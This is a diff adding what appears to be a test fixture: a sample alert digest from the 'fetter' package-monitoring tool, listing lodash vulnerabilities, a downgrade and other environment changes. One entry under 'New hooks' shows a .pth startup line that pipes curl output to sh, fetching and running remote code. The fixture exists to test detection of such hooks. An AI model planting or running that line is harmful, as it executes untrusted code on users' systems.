@@ -1,0 +1,111 @@
+fetter · host
+2026-11-16 19:50–20:51 · ALERT · 6 reports, 5 scans
+rolling baseline · latest scan 2026-11-16 19:51: 1 origin, 1 site, 2 packages
+
+5 new vulnerabilities, 1 new hook, 1 downgrade, 1 new violation, 4 changes, 2 transient items, 4 problems, 1 resolved vulnerability
+
+ALERTS
+======
+
+New vulnerabilities
+-------------------
+- GHSA-r5fr-rjxr-66jc  CVSS 8.1
+  npm · lodash 4.17.21 · existing
+  lodash vulnerable to Code Injection via `_.template` imports key names
+  https://osv.dev/vulnerability/GHSA-r5fr-rjxr-66jc
+- GHSA-p6mc-m468-83gw  CVSS 7.4
+  npm · lodash 4.17.15 · introduced
+  Prototype Pollution in lodash
+  https://osv.dev/vulnerability/GHSA-p6mc-m468-83gw
+- GHSA-35jh-r3h4-6jhm  CVSS 7.2
+  npm · lodash 4.17.15 · introduced
+  Command Injection in lodash
+  https://osv.dev/vulnerability/GHSA-35jh-r3h4-6jhm
+- GHSA-xxjr-mmjv-4gpg  CVSS 6.9
+  npm · lodash 4.17.21 · existing
+  Lodash has Prototype Pollution Vulnerability in `_.unset`, `_.omit`, and `_.pullAt` functions
+  https://osv.dev/vulnerability/GHSA-xxjr-mmjv-4gpg
+- GHSA-29mw-wpgm-hmr9  CVSS 5.3
+  npm · lodash 4.17.15 · introduced
+  Regular Expression Denial of Service (ReDoS) in lodash
+  https://osv.dev/vulnerability/GHSA-29mw-wpgm-hmr9
+
+New hooks
+---------
+- sitecustomize.pth
+  npm · /p · 2026-11-16 19:53
+    import os; os.system('curl x | sh')  # <b>
+
+Downgrades
+----------
+- lodash 4.17.21 → 4.17.15
+  npm · /home/user/proj/package-lock.json · 2026-11-16 19:51
+
+New allow-list violations
+-------------------------
+- Unrequired
+  python · requests · /home/user/.venv/lib/python3.12/site-packages
+
+Alert reports
+-------------
+- 2026-11-16 19:51
+  2 new vulns
+- 2026-11-16 19:51
+  3 new vulns, 1 downgrade
+- 2026-11-16 19:53
+  1 new hook, 1 new violation
+
+PROBLEMS
+========
+- no scan for 59m
+  2026-11-16 19:51–20:51 · no-scan
+- Unknown control command: "bogus" (expected scan, report, or stop)
+  2026-11-16 19:51 · error
+- fetter exited with 101
+  2026-11-16 19:55 · fetter-exit
+- vulnerability audit failed: OSV unavailable
+  2026-11-16 19:56 · audit-error
+
+TRANSIENT
+=========
+- tmp-pkg: (none) → 0.1 → (none)
+  installed then removed, 2026-11-16 19:53–19:55 · npm · /p
+- GHSA-tmp in react 18.3.1
+  fixed within the period, 2026-11-16 19:55–19:56
+  https://osv.dev/GHSA-tmp
+
+CHANGES
+=======
+
+npm · /home/user/proj/package-lock.json
+---------------------------------------
+- added left-pad 1.3.0
+  2026-11-16 19:51
+- downgraded lodash 4.17.21 → 4.17.15
+  2026-11-16 19:51
+
+npm · /p
+--------
+- upgraded react 18.2.0 → 18.3.1
+  2026-11-16 19:53
+
+Origins and sites
+-----------------
+- added origin /home/user/proj2
+  npm · 2026-11-16 19:53
+
+RESOLVED
+========
+
+Resolved vulnerabilities
+------------------------
+- GHSA-old in minimist 1.2.0
+  2026-11-16 19:53
+
+Removed hooks
+-------------
+- old.pth
+  npm · /p · 2026-11-16 19:53
+
+--
+fetter-scope VERSION · the full digest is attached as JSON
